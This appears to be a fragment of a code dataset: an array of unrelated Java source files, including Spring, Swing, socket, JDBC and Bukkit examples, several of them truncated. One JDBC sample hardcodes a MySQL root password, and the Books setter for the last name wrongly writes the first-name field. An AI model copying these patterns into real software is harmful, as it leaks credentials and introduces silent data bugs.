\u043c\u0435\u043d\u044f\u0435\u043c \u043d\u0430 \u0447\u0435\u0440\u043d\u044b\u0439,\n        // \u0438\u043d\u0430\u0447\u0435 \u043d\u0430 \u043a\u0440\u0430\u0441\u043d\u044b\u0439.\n        //\u0446\u0432\u0435\u0442\u0430 \u043f\u043e\u0442\u043e\u043c\u043a\u043e\u0432 \u043c\u0435\u043d\u044f\u0435\u043c \u043d\u0430 \u0447\u0435\u0440\u043d\u044b\u0439:\n        node.left.color = Color.BLACK;\n        node.right.color = Color.BLACK;\n    }\n    private Node balance(Node node) {\n        boolean flag =true;//\u0445\u043e\u0442\u0438\u043c \u0431\u0430\u043b\u0430\u043d\u0441\u0438\u0440\u043e\u0432\u0430\u0442\u044c.\n        Node res = node; //\u043a\u043e\u0440\u0435\u043d\u044c \u043f\u043e\u0441\u043b\u0435 \u0431\u0430\u043b\u0430\u043d\u0441\u0438\u0440\u043e\u0432\u043a\u0438\n        do {\n            flag = false; //\u043a\u0430\u043a-\u0431\u044b \u0446\u0438\u043a\u043b \u0433\u043e\u0432\u043e\u0440\u0438\u0442: \u0431\u0430\u043b\u0430\u043d\u0441\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u043d\u0435 \u043d\u0430\u0434\u043e!\n//todo 1.\u0415\u0441\u043b\u0438 \u043f\u0440\u0430\u0432\u044b\u0439 \u0434\u043e\u0447\u0435\u0440\u043d\u0438\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442 \u043a\u0440\u0430\u0441\u043d\u044b\u0439, \u0430 \u043b\u0435\u0432\u044b\u0439 \u0447\u0435\u0440\u043d",
    "package com.unibell.client.controller;\n\nimport com.unibell.client.entity.Contact;\nimport com.unibell.client.service.ContactService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.web.bind.annotation.*;\n\nimport java.util.List;\n\n@RestController\n@RequestMapping(\"/contacts\")\npublic class ContactController {\n\n    private final ContactService contactService;\n\n    @Autowired\n    public ContactController(ContactService contactService) {\n        this.contactService = contactService;\n    }\n\n    /**\n     * 2. \u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u043d\u043e\u0432\u043e\u0433\u043e \u043a\u043e\u043d\u0442\u0430\u043a\u0442\u0430 \u043a\u043b\u0438\u0435\u043d\u0442\u0430 (\u0442\u0435\u043b\u0435\u0444\u043e\u043d \u0438\u043b\u0438 email)\n     */\n    @PostMapping(\"/{clientId}/add\")\n    public ResponseEntity<Contact> add(\n            @PathVariable Long clientId,\n            @RequestParam String type,\n            @RequestParam String value) {\n        Contact newContact = contactService.add(clientId, type, value);\n        return new ResponseEntity<>(newContact, HttpStatus.CREATED);\n    }\n\n    /**\n     * 5. \u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u0441\u043f\u0438\u0441\u043a\u0430 \u043a\u043e\u043d\u0442\u0430\u043a\u0442\u043e\u0432 \u0437\u0430\u0434\u0430\u043d\u043d\u043e\u0433\u043e \u043a\u043b\u0438\u0435\u043d\u0442\u0430\n     */\n    @GetMapping(\"/{clientId}/all\")\n    public ResponseEntity<List<Contact>> getContactsByClientId(@PathVariable Long clientId) {\n        List<Contact> contacts = contactService.getContactsByClientId(clientId);\n        return new ResponseEntity<>(contacts, HttpStatus.OK);\n    }\n\n    /**\n     * 6. \u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u0441\u043f\u0438\u0441\u043a\u0430 \u043a\u043e\u043d\u0442\u0430\u043a\u0442\u043e\u0432 \u0437\u0430\u0434\u0430\u043d\u043d\u043e\u0433\u043e \u0442\u0438\u043f\u0430 \u0437\u0430\u0434\u0430\u043d\u043d\u043e\u0433\u043e \u043a\u043b\u0438\u0435\u043d\u0442\u0430\n     */\n    @GetMapping(\"/{clientId}/type/get{contactType}\")\n    public ResponseEntity<List<Contact>> getContactsByClientIdAndType(\n            @PathVariable Long clientId,\n            @RequestParam(value = \"type\", required = false) String contactType) {\n        List<Contact> contacts = contactService.getClientContactsByType(clientId, contactType);\n        return new ResponseEntity<>(contacts, HttpStatus.OK);\n    }\n\n}\n",
    "package com.soap;\n\npublic class Books {\n    private String title;\n    private String author_first_name;\n    private String author_last_name;\n    private String genre;\n    private int publication_year;\n\n    public Books(String title, String author_first_name, String author_last_name,  String genre, int publication_year) {\n        this.title = title;\n        this.author_first_name = author_first_name;\n        this.author_last_name = author_last_name;\n        this.genre = genre;\n        this.publication_year = publication_year;\n    }\n    public String getTitle() {\n        return title;\n    }\n    public String getAuthor_first_name() {\n        return author_first_name;\n    }\n    public String getAuthor_last_name() {\n        return author_last_name;\n    }\n    public String getGenre() {\n        return genre;\n    }\n    public int getPublication_year() {\n        return publication_year;\n    }\n\n    public void setTitle(String title) {\n        this.title = title;\n    }\n    public void setAuthor_first_name(String author_first_name) {\n        this.author_first_name = author_first_name;\n    }\n    public void setAuthor_last_name(String author_last_name) {\n        this.author_first_name = author_last_name;\n    }\n    public void setGenre(String genre) {\n        this.genre = genre;\n    }\n    public void setPublication_year(int publication_year) {\n        this.publication_year = publication_year;\n    }\n\n\n    @Override\n    public String toString() {\n        return \"Books{\" + \"title=\" + title + \", author_first_name=\" +  author_first_name +\", author_last_name=\" + author_last_name +\n                \", genre=\" + genre + \", publication_year=\" + publication_year + \"}\";\n    }\n}\n",
    "package com.konylabs.ffi;\r\nimport java.util.HashMap;\r\nimport java.util.Hashtable;\r\nimport java.util.Vector;\r\nimport com.konylabs.api.TableLib;\r\nimport com.konylabs.vm.LuaTable;\r\n\r\n\r\n\r\nimport com.kony.logger.Core.KonyJSFacade;\r\nimport com.konylabs.libintf.Library;\r\nimport com.konylabs.libintf.JSLibrary;\r\nimport com.konylabs.vm.LuaError;\r\nimport com.konylabs.vm.LuaNil;\r\n\r\n\r\npublic class N_KonyLogger extends JSLibrary {\r\n\r\n \r\n \r\n\tpublic static final String getLogLevel = \"getLogLevel\";\r\n \r\n \r\n\tpublic static final String flush = \"flush\";\r\n \r\n \r\n\tpublic static final String setConfig = \"setConfig\";\r\n \r\n \r\n\tpublic static final String setPersistorConfig = \"setPersistorConfig\";\r\n \r\n \r\n\tpublic static final String setLogLevel = \"setLogLevel\";\r\n \r\n \r\n\tpublic static final String activatePersistors = \"activatePersistors\";\r\n \r\n \r\n\tpublic static final String deactivatePersistors = \"deactivatePersistors\";\r\n \r\n \r\n\tpublic static final String setClaimsToken = \"setClaimsToken\";\r\n\r\n\tpublic static final String subscribeLogListener = \"subscribeLogListener\";\r\n \r\n\tpublic static final String unsubscribeLogListener = \"unsubscribeLogListener\";\r\n\t\r\n\tpublic static final String setGlobalRequestParam = \"setGlobalRequestParam\";\r\n\t\r\n\tpublic static final String removeGlobalRequestParam = \"removeGlobalRequestParam\";\r\n\t\r\n\tpublic static final String resetGlobalRequestParams = \"resetGlobalRequestParams\";\r\n \r\n\tString[] methods = { getLogLevel, flush, setConfig, setPersistorConfig, setLogLevel, activatePersistors, deactivatePersistors, setClaimsToken, subscribeLogListener, unsubscribeLogListener, \r\n\tsetGlobalRequestParam, removeGlobalRequestParam, resetGlobalRequestParams};\r\n\r\n\r\n Library libs[] = null;\r\n public Library[] getClasses() {\r\n libs = new Library[1];\r\n libs[0] = new InitializeLogger();\r\n return libs;\r\n }\r\n\r\n\r\n\r\n\tpublic N_KonyLogger(){\r\n\t}\r\n\r\n\tpublic Object[] execute(int index, Object[] params) {\r\n\t\t// TODO Auto-generated method stub\r\n\t\tObject[] ret = null;\r\n \r\n\t\tint paramLen = params.length;\r\n int inc = 1;\r\n\t\tswitch (index) {\r\n \t\tcase 0:\r\n if (paramLen != 0){ return new Object[] {new Double(100),\"Invalid Params\"}; }\r\n ret = this.getLogLevel( );\r\n \r\n \t\t\tbreak;\r\n \t\tcase 1:\r\n if (paramLen != 0){ return new Object[] {new Double(100),\"Invalid Params\"}; }\r\n ret = this.flush( );\r\n \r\n \t\t\tbreak;\r\n \t\tcase 2:\r\n if (paramLen != 1){ return new Object[] {new Double(100),\"Invalid Params\"}; }\r\n com.konylabs.vm.LuaTable config2 = null;\r\n if(params[0] != null && params[0] != LuaNil.nil) {\r\n config2 = (com.konylabs.vm.LuaTable)params[0];\r\n }\r\n ret = this.setConfig( config2 );\r\n \r\n \t\t\tbreak;\r\n \t\tcase 3:\r\n if (paramLen != 1){ return new Object[] {new Double(100),\"Invalid Params\"}; }\r\n com.konylabs.vm.LuaTable persistor3 = null;\r\n if(params[0] != null && params[0] != LuaNil.nil) {\r\n persistor3 = (com.konylabs.vm.LuaTable)params[0];\r\n }\r\n ret = this.setPersistorConfig( persistor3 );\r\n \r\n \t\t\tbreak;\r\n \t\tcase 4:\r\n if (paramLen != 1){ return new Object[] {new Double(100),\"Invalid Params\"}; }\r\n Double logLevel4 = null;\r\n if(params[0] != null && params[0] != LuaNil.nil) {\r\n logLevel4 = (Double)params[0];\r\n }\r\n ret = this.setLogLevel( logLevel4 );\r\n \r\n \t\t\tbreak;\r\n \t\tcase 5:\r\n if (paramLen != 1){ return new Object[] {new Double(100),\"Invalid Params\"}; }\r\n Double activatedList5 = null;\r\n if(params[0] != null && params[0] != LuaNil.nil) {\r\n activatedList5 = (Double)params[0];\r\n }\r\n ret = this.activatePersistors( activatedList5 );\r\n \r\n \t\t\tbreak;\r\n \t\tcase 6:\r\n if (paramLen != 1){ return new Object[] {new Double(100),\"Invalid Params\"}; }\r\n Double deactivatedList6 = null;\r\n if(params[0] != null && params[0] != LuaNil.nil) {\r\n deactivatedList6 = (Double)params[0];\r\n }\r\n ret = this.deactivatePersistors( deactivatedList6 );\r\n \r\n \t\t\tbreak;\r\n \t\tcase 7:\r\n if (paramLen != 1){ return new Object[] {new Double(100),\"Invalid Params\"}; }\r\n java.lang.String claimsToken7 = null;\r\n if(params[0] != null && params[0] != LuaNil.nil) {\r\n claimsToken7 = (java.lang.String)params[0];\r\n }\r\n ret = this.setClaimsToken( claimsToken7 );\r\n \r\n \t\t\tbreak;\r\n \t\tcase 8:\r\n if (paramLen != 1){ return new Object[] {new Double(100),\"Invalid Params\"}; }\r\n com.konylabs.vm.Function logListener0 = null;\r\n if(params[0] != null && params[0] != LuaNil.nil) {\r\n logListener0 = (com.konylabs.vm.Function)params[0];\r\n }\r\n ret = this.subscribeLogListener( logListener0 );\r\n \t\t\tbreak;\r\n \t\tcase 9:\r\n if (paramLen != 0){ return new Object[] {new Double(100),\"Invalid Params\"}; }\r\n ret = this.unsubscribeLogListener( );\r\n \r\n \t\t\tbreak;\r\n\t\tcase 10:\r\n\t\t if (paramLen != 3){ return new Object[] {new Double(100),\"Invalid Params\"}; }\r\n java.lang.String paramName10 = null;\r\n if(params[0] != null && params[0] != LuaNil.nil) {\r\n paramName10 = (java.lang.String)params[0];\r\n }\r\n java.lang.String paramValue10 = null;\r\n if(params[1] != null && params[1] != LuaNil.nil) {\r\n paramValue10 = (java.lang.String)params[1];\r\n }\r\n java.lang.String paramType10 = null;\r\n if(params[2] != null && params[2] != LuaNil.nil) {\r\n paramType10 = (java.lang.String)para",
    "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class CreateDatabaseExample {\n\n    private static final String JDBC_URL = \"jdbc:mysql://localhost:3306/\";\n    private static final String USERNAME = \"root\";\n    private static final String PASSWORD = \"sahithi@12345678\"; // Replace with your MySQL password\n    private static final String DATABASE_NAME = \"my_db\"; // Specify the name of the database you want to create\n\n    public static void main(String[] args) {\n        try {\n            // Establishing connection\n            Connection connection = DriverManager.getConnection(JDBC_URL, USERNAME, PASSWORD);\n            Statement statement = connection.createStatement();\n\n            // Creating database\n            String createDatabaseQuery = \"CREATE DATABASE IF NOT EXISTS \" + DATABASE_NAME;\n            statement.executeUpdate(createDatabaseQuery);\n\n            System.out.println(\"Database created successfully.\");\n\n            // Closing resources\n            statement.close();\n            connection.close();\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
    "package de.merlin.tab;\r\n\r\nimport org.bukkit.Bukkit;\r\nimport org.bukkit.command.Command;\r\nimport org.bukkit.command.CommandSender;\r\nimport org.bukkit.command.TabCompleter;\r\nimport org.bukkit.entity.Player;\r\nimport org.jetbrains.annotations.NotNull;\r\nimport org.jetbrains.annotations.Nullable;\r\n\r\nimport java.util.List;\r\n\r\npublic class PartyTabCompleter implements TabCompleter {\r\n\r\n    @Override\r\n    public @Nullable List<String> onTabComplete(@NotNull CommandSender commandSender, @NotNull Command command, @NotNull String s, @NotNull String[] strings) {\r\n\r\n        if (commandSender instanceof Player) {\r\n            Player p = (Player) commandSender;\r\n\r\n            if (strings.length == 1) {\r\n                return List.of(\"create\", \"invite\", \"accept\", \"deny\", \"leave\");\r\n            }\r\n\r\n            if (strings.length == 2 && (strings[0].equalsIgnoreCase(\"invite\") || strings[0].equalsIgnoreCase(\"accept\") || strings[0].equalsIgnoreCase(\"deny\"))) {\r\n                return Bukkit.getOnlinePlayers().stream().filter(player -> !player.equals(p)).map(Player::getName).toList();\r\n            }\r\n        }\r\n\r\n        return null;\r\n    }\r\n}\r\n",
    "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintWriter;\nimport java.net.Socket;\n\npublic class Cliente {\n    public static void main(String[] args) {\n        \n        int puerto = 8080;\n\n        try {\n            \n            // Cuando un cliente se conecta se abre el puerto a escuchar conexiones de cliente\n            // Si el servidor responde, AQUI SE CREA EL SOCKET EN EL SO\n            Socket cs = new Socket(\"localhost\", puerto);\n\n            // Establecer el stream de salida\n            PrintWriter out = new PrintWriter(cs.getOutputStream(), true);\n\n            // Establece el stream de entrada\n            BufferedReader in = new BufferedReader(new InputStreamReader(cs.getInputStream()));\n\n            String linearecibida;\n\n            // Leemos la linea por linea hasta recibir \"EOF\"\n            while (!(linearecibida = in.readLine()).equalsIgnoreCase(\"EOF\")) {\n                System.out.println(\"Servidor: \" + linearecibida);\n            }\n\n            // Env\u00eda la despedida al servidor\n            out.println(\"Recepci\u00f3n de datos correcta...\");\n\n            out.close();\n            in.close();\n            cs.close();\n\n        } catch (IOException ex) {\n            System.out.println(ex);\n        }\n    }\n}\n",
    "import java.awt.BorderLayout;\nimport java.awt.Font;\nimport java.awt.FontFormatException;\nimport java.awt.Color;\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.CharBuffer;\n\nimport javax.swing.*;\nimport javax.swing.text.*;\n\nimport java.lang.Math;\n\nimport java.util.Arrays;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\n\nclass Display {\n    private JFrame frame;\n    private JTextArea boardTextAreaBoard, consoleTextArea;\n    private JTextField textField;\n\n    public Readable in;\n    public JTextAreaPrintStream out;\n    public JTextAreaPrintStream outBoard;\n    \n    private static int displayedLength(String str){\n        int length = 0;\n        for(int i=0;i<str.length();i++){\n            int cp = str.codePointAt(i);\n            if(cp==9450 || (cp>=9312 && cp<=9331) || cp==9450){\n                length+=2;\n            }else{\n                length+=1;\n            }\n        }\n        return length;\n    }\n    \n    private static int width(String[] strarr){\n        int maxLength = 0;\n        for(String line : strarr){\n            if(displayedLength(line) > maxLength){\n                maxLength = displayedLength(line);\n            }\n        }\n        return maxLength;\n    }\n    \n    private static int height(String[] strarr){\n        return strarr.length;\n    }\n    \n    /**\n     * Complete every line of the string array with space to have the same length everywhere\n     */\n    private static String[] pad(String[] strarr){\n        return pad(strarr, ' ');\n    }\n    \n    /**\n     * Complete every line of the string array to have the same length everywhere\n     */\n    private static String[] pad(String[] strarr, char c){\n        return pad(strarr, c, height(strarr), width(strarr));\n    }\n    \n    /**\n     * Complete the string array to have the given shape\n     */\n    private static String[] pad(String[] strarr, char c, int height, int width){\n        String[] paddedStrarr = new String[height];        \n        for(int i=0;i<height;i++){\n            if(i<strarr.length){\n                paddedStrarr[i] = strarr[i] + (c+\"\").repeat(width-displayedLength(strarr[i]));\n            }else{\n                paddedStrarr[i] = (c+\"\").repeat(width);\n            }\n        }\n        return paddedStrarr;\n    }\n\n    public static String[] concatStringArray(String[] strarr1, String[] strarr2, boolean vStacked){\n        String[] arr;\n        if(vStacked){\n            int newWidth = Math.max(width(strarr1), width(strarr2));\n            strarr1 = pad(strarr1, ' ', height(strarr1), newWidth);\n            strarr2 = pad(strarr2, ' ', height(strarr2), newWidth);\n            \n            arr = new String[strarr1.length+strarr2.length];\n            for(int i=0;i<strarr1.length;i++){\n                arr[i] = strarr1[i];\n            }\n            for(int i=0;i<strarr2.length;i++){\n                arr[strarr1.length+i] = strarr2[i];\n            }\n        }else{\n            int newHeight = Math.max(height(strarr1), height(strarr2));\n            strarr1 = pad(strarr1, ' ', newHeight, width(strarr1));\n            strarr2 = pad(strarr2, ' ', newHeight, width(strarr2));\n            \n            arr = strarr1.clone();\n            for(int i=0;i<strarr2.length;i++){\n                arr[i] += strarr2[i];\n            }\n        }\n        \n        return arr;\n    }\n\n    public static String[] emptyStringArray(int rows, int cols, String str){\n        String[] arr = new String[rows];\n        Arrays.fill(arr, str.repeat(cols));\n        return arr;\n    }\n\n    public static String[] emptyStringArray(int rows, int cols){\n        return emptyStringArray(rows, cols, \" \");\n    }\n\n    public Display(int rowsBoard, int rowsConsole, int cols){\n        Font font;\n        try {\n            font = Font.createFont(Font.TRUETYPE_FONT, new File(\"unifont.otf\"));\n            font  = font.deriveFont(Font.PLAIN, 14);\n        } catch (FontFormatException | IOException e) {\n            font = new Font(Font.MONOSPACED, Font.PLAIN, 14);\n            e.printStackTrace();\n        }\n\n        boardTextAreaBoard = new JTextArea(rowsBoard, cols);\n        boardTextAreaBoard.setEditable(false);\n        boardTextAreaBoard.setLineWrap(true);\n        boardTextAreaBoard.setFont(font);\n        outBoard = new JTextAreaPrintStream(boardTextAreaBoard);\n\n        consoleTextArea = new JTextArea(rowsConsole, cols);\n        consoleTextArea.setBackground(new Color(240,240,240));\n        consoleTextArea.setEditable(false);\n        consoleTextArea.setLineWrap(true);\n        consoleTextArea.setFont(font);\n        consoleTextArea.setBorder(BorderFactory.createLineBorder(Color.BLACK));\n        DefaultCaret consoleCaret = (DefaultCaret) consoleTextArea.getCaret();\n        consoleCaret.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);\n        out = new JTextAreaPrintStream(consoleTextArea);\n\n        JScrollPane scrollPane = new JScrollPane(consoleTextArea);\n                \n        textField = new ReadableJTextField(cols);\n        textField.setBackground(new ",
    "import java.net.*;\r\nimport java.io.*;\r\nimport java.util.*;\r\nclass TCPSender\r\n{\r\n\tpublic static void main(String args[])\r\n\t{\r\n\t\ttry\r\n\t\t{\r\n\t\t\tServerSocket ss =new ServerSocket(2000);\r\n\t\t\tSocket s=ss.accept();\r\n\t\t\tSystem.out.println(\"Conneected\");\r\n\t\t\tBufferedReader br=new BufferedReader(new InputStreamReader(s.getInputStream()));\r\n\t\t\tBufferedReader user=new BufferedReader(new InputStreamReader(System.in));\r\n\t\t\tPrintStream out=new PrintStream(s.getOutputStream());\r\n\t\t\tSystem.out.println(\"Sending 5 packets....\");\r\n\t\t\tString expected=\"\";\r\n\t\t\tString response=\"\";\r\n\t\t\tint i;\r\n\t\t\tfor(i=1;i<=5;i++)\r\n\t\t\t{\r\n\t\t\t\tString data=\"data\"+i;\r\n\t\t\t\tSystem.out.println(\"Sending: \"+data);\r\n\t\t\t\tout.println(data);\r\n\t\t\t\tout.flush();\r\n\t\t\t\tThread.sleep(1000);\r\n\t\t\t\texpected=\"ack\"+i;\r\n\t\t\t\tresponse=br.readLine();\r\n\t\t\t\tif(expected.compareTo(response)!=0)\r\n\t\t\t\t{\r\n\t\t\t\t\tSystem.out.println(\"Should Retransmit!!..Ack lost!!\");\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tSystem.out.println(\"Received Response: \"+response);\r\n\t\t\t}\r\n\t\t}\r\n\t\tcatch(Exception e)\r\n\t\t{\r\n\t\t\tSystem.out.println(e);\r\n\t\t}\r\n\t}\r\n}",
    "import javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.KeyEvent;\nimport java.awt.event.KeyListener;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.PrintWriter;\nimport java.net.Socket;\n\npublic class Client extends JFrame {\n    Socket socket;\n    BufferedReader br;\n    PrintWriter out;\n    // declare components\n    private JLabel Heading = new JLabel(\"client area\");\n    private JTextArea message_area = new JTextArea();\n    private JTextField message_input = new JTextField();\n    private Font font = new Font(\"Roboto\",Font.PLAIN,20);\n    // constructors\n    public Client(){\n        try{\n            System.out.println(\"Sending request to server..!\");\n            socket = new Socket(\"127.0.0.1\",7777);\n            System.out.println(\"connectiobn done..!\");\n\n            br = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            out = new PrintWriter(socket.getOutputStream());\n//\n            createGUI();\n            handleeevnts();\n            startreading();\n//            startwriting();\n        }\n        catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n\n    private void handleeevnts() {\n\n        message_input.addKeyListener(new KeyListener() {\n            @Override\n            public void keyTyped(KeyEvent e) {\n\n            }\n\n            @Override\n            public void keyPressed(KeyEvent e) {\n\n            }\n\n            @Override\n            public void keyReleased(KeyEvent e) {\n//                System.out.println(\"key released\"+e.getKeyCode());\n                if (e.getKeyCode()==10){\n                    System.out.println(\"you've pressed enter button\");\n                    String contenttosend = message_input.getText();\n                    message_area.append(\"Me : \"+contenttosend+\"\\n\");\n                    out.println(contenttosend);\n                    out.flush();\n                    message_input.setText(\"\");\n                    message_input.requestFocus();\n                }\n            }\n        });\n    }\n\n    // creating gui\n    private void createGUI(){\n        // gui code\n        this.setTitle(\"client messenger[END]\");\n        this.setSize(600,600);\n        this.setLocationRelativeTo(null);\n        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        this.setVisible(true);\n\n        // code for component\n        Heading.setFont(font);\n        message_area.setFont(font);\n        message_input.setFont(font);\n        Heading.setIcon(new ImageIcon(\"live-chat-icon-7416.png\"));\n        Heading.setHorizontalTextPosition(SwingConstants.CENTER);\n        Heading.setVerticalTextPosition(SwingConstants.BOTTOM);\n        Heading.setHorizontalAlignment(SwingConstants.CENTER);\n        Heading.setBorder(BorderFactory.createEmptyBorder(20,20,20,20));\n\n        message_area.setEditable(false);\n        message_area.setAutoscrolls(false);\n\n        message_input.setHorizontalAlignment(SwingConstants.CENTER);\n\n        // code for setting frame layout\n        this.setLayout(new BorderLayout());\n\n        //adding components to frame\n        this.add(Heading,BorderLayout.NORTH);\n        JScrollPane jsp = new JScrollPane(message_area);\n        this.add(jsp,BorderLayout.CENTER);\n        this.add(message_input,BorderLayout.SOUTH);\n\n\n        this.setVisible(true);\n    }\n\n    \n\n// Start  reading [method]\n    public void startreading(){\n        //thread - read krke deta rahega\n        Runnable r1 = ()->{\n            System.out.println(\"Reader stared...!\");\n            try {\n                while (!socket.isClosed()) {\n                    String msg = br.readLine();\n                    if (msg.equals(\"exit\")) {\n                        System.out.println(\"server terminated the chat..!\");\n                        JOptionPane.showMessageDialog(this,\"server terminated the chat\");\n                        message_input.setEnabled(false);\n                        socket.close();\n                        break;\n                    }\n//                    System.out.println(\"server : \" + msg);\n                    message_area.append(\"server : \" + msg +\"\\n\");\n                    message_area.setCaretPosition(message_area.getDocument().getLength());\n                }\n\n                System.out.println(\"Connection is closd...!\");\n            }\n                catch (Exception e){\n//                    e.printStackTrace();\n//                    System.out.println(\"Connection is closd...!\");\n            }\n        };\n        new Thread(r1).start();\n    }\n// start writing method to send\n    public void startwriting(){\n        //thread - data user lega and the send krega client tak\n        Runnable r2 = ()->{\n            System.out.println(\"Writer stared...!\");\n            try {\n                while (!socket.isClosed()) {\n                    BufferedReader br1 = new BufferedReader(new InputStreamReader(System.in));\n                    String content = br1.readLine();\n                    out.println(content);\n                    out.flush();\n              ",
    "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.List;\n\npublic class GenerateInfoFiles {\n\n    // M\u00e9todo para crear el archivo de ventas para un vendedor\n    public static void createSalesMenFile(List<String[]> salesData, String name, int id) {\n        // Nombre del archivo\n        String filename = name + \"_\" + id + \"_sales.csv\";\n        try (FileWriter writer = new FileWriter(filename)) {\n            // Escribir la cabecera del archivo CSV\n            writer.append(\"TipoDocumentoVendedor,N\u00fameroDocumento\\n\");\n            // Escribir datos de ventas en el archivo\n            for (String[] sale : salesData) {\n                writer.append(\"cedula;\" + id + \",\" + sale[0] + \";\" + sale[1] + \"\\n\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // M\u00e9todo para crear el archivo de informaci\u00f3n de productos\n    public static void createProductsFile(List<String[]> productsData) {\n        try (FileWriter writer = new FileWriter(\"products_info.csv\")) {\n            // Escribir la cabecera del archivo CSV\n            writer.append(\"IDProducto,NombreProducto,PrecioPorUnidad\\n\");\n            // Escribir datos de productos en el archivo\n            for (String[] product : productsData) {\n                writer.append(\"IDProducto\" + product[0] + \",\" + product[1] + \",\" + product[2] + \"\\n\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // M\u00e9todo para crear el archivo de informaci\u00f3n de vendedores\n    public static void createSalesManInfoFile(List<String[]> salesmenData) {\n        try (FileWriter writer = new FileWriter(\"salesmen_info.csv\")) {\n            // Escribir la cabecera del archivo CSV\n            writer.append(\"TipoDocumento,N\u00fameroDocumento,NombresApellidos\\n\");\n            // Escribir datos de vendedores en el archivo\n            for (String[] salesman : salesmenData) {\n                writer.append(\"Cedula,\" + salesman[0] + \",\" + salesman[1] + \"\\n\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // M\u00e9todo principal (main)\n    public static void main(String[] args) {\n        // Datos de muestra\n        List<String[]> salesData = List.of(new String[]{\"1\", \"10\"}, new String[]{\"2\", \"5\"}, new String[]{\"3\", \"8\"});\n        List<String[]> productsData = List.of(new String[]{\"1\", \"Reloj\", \"10.99\"}, new String[]{\"2\", \"Collar\", \"20.99\"}, new String[]{\"3\", \"Anillo\", \"15.99\"});\n        List<String[]> salesmenData = List.of(new String[]{\"1\", \"Tatiana Rua\"}, new String[]{\"2\", \"David Rodriguez\"}, new String[]{\"3\", \"Miguel Rodriguez\"});\n\n        // Generar archivos de muestra\n        createSalesMenFile(salesData, \"Tatiana_Rua\", 1);\n        createProductsFile(productsData);\n        createSalesManInfoFile(salesmenData);\n    }\n}\n",
    "package com.example.weatherinfo.model;\n\nimport jakarta.persistence.Column;\nimport jakarta.persistence.Entity;\nimport jakarta.persistence.GeneratedValue;\nimport jakarta.persistence.GenerationType;\nimport jakarta.persistence.Id;\nimport jakarta.persistence.Table;\n\n@Entity\n@Table(name = \"pincode\")\npublic class Pincode {\n\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n\n    @Column(nullable = false, length = 6)\n    private String pincode;\n\n    @Column(name = \"latitude\")\n    private Double latitude;\n\n    @Column(name = \"longitude\")\n    private Double longitude;\n\n    @Column(nullable = false, length = 4, name = \"country_code\")\n    private String countryCode;\n\n    public Pincode() {\n    }\n\n    public Pincode(String pincode, Double latitude, Double longitude, String countryCode) {\n        this.pincode = pincode;\n        this.latitude = latitude;\n        this.longitude = longitude;\n        this.countryCode = countryCode;\n    }\n\n    public Long getId() {\n        return id;\n    }\n\n    public void setId(Long id) {\n        this.id = id;\n    }\n\n    public String getPincode() {\n        return pincode;\n    }\n\n    public void setPincode(String pincode) {\n        this.pincode = pincode;\n    }\n\n    public Double getLatitude() {\n        return latitude;\n    }\n\n    public void setLatitude(Double latitude) {\n        this.latitude = latitude;\n    }\n\n    public Double getLongitude() {\n        return longitude;\n    }\n\n    public void setLongitude(Double longitude) {\n        this.longitude = longitude;\n    }\n\n    public String getCountryCode() {\n        return countryCode;\n    }\n\n    public void setCountryCode(String countryCode) {\n        this.countryCode = countryCode;\n    }\n}\n",
    "public class HousingPriceAnalyzer {\n\n  public static Map<PriceRange, HousingStats> analyze(List<Double> prices, List<Double> squareFootages) {\n    if (prices.size() != squareFootages.size()) {\n      throw new IllegalArgumentException(\"Prices and square footages must have the same size\");\n    }\n    Map<PriceRange, HousingStats> results = new HashMap<>();\n    for (int i = 0; i < prices.size(); i++) {\n      double price = prices.get(i);\n      double sqFootage = squareFootages.get(i);\n      PriceRange range = getPriceRange(price);\n      HousingStats stats = results.get(range);\n      if (stats == null) {\n        stats = new HousingStats();\n        results.put(range, stats);\n      }\n      stats.count++;\n      stats.totalPrice += price;\n      stats.totalSqFootage += sqFootage;\n    }\n    return results;\n  }\n\n  private static PriceRange getPriceRange(double price) {\n    int rangeStart = (int) (price / 100000) * 100000;\n    return new PriceRange(rangeStart, rangeStart + 100000);\n  }\n\n  static class PriceRange {\n    final int startPrice;\n    final int endPrice;\n\n    public PriceRange(int startPrice, int endPrice) {\n      this.startPrice = startPrice;\n      this.endPrice = endPrice;\n    }\n\n    @Override\n    public String toString() {\n      return \"$\" + startPrice + \" - $\" + endPrice;\n    }\n  }\n\n  static class HousingStats {\n    int count;\n    double totalPrice;\n    double totalSqFootage;\n\n    double getAveragePrice() {\n      return count > 0 ? totalPrice / count : 0.0;\n    }\n\n    double getAverageSqFootage() {\n      return count > 0 ? totalSqFootage / count : 0.0;\n    }\n  }\n}\n",
